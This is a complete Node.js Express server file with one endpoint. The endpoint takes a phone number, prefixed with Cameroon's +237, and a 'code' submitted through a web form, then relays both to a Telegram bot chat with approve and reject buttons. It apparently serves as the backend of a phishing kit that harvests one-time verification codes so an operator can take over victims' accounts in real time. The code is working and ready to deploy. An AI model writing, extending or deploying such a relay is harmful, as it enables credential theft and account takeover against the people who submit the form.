const express = require('express');
const cors = require('cors');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());
app.use(express.static(__dirname)); // Serves your HTML/CSS/JS

// The endpoint that receives the form data
app.post('/api/apply', async (req, res) => {
    const { phone, code } = req.body;

    const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
    const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

    // THIS IS THE MESSAGE THAT GOES TO TELEGRAM
    const message = `🚨 *NEW APPLICATION* 🚨\n\n` +
                    `📞 *Phone:* +237 ${phone}\n` +
                    `🔑 *Code:* ${code}\n`;

    try {
        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'Markdown',
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: "✅ APPROVE", callback_data: `approve_${phone}` },
                            { text: "❌ REJECT", callback_data: `reject_${phone}` }
                        ]
                    ]
                }
            })
        });

        if (response.ok) {
            res.status(200).json({ success: true });
        } else {
            res.status(500).json({ success: false, message: "Telegram error" });
        }
    } catch (error) {
        console.error(error);
        res.status(500).json({ success: false, message: "Server error" });
    }
});

// Start the server
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});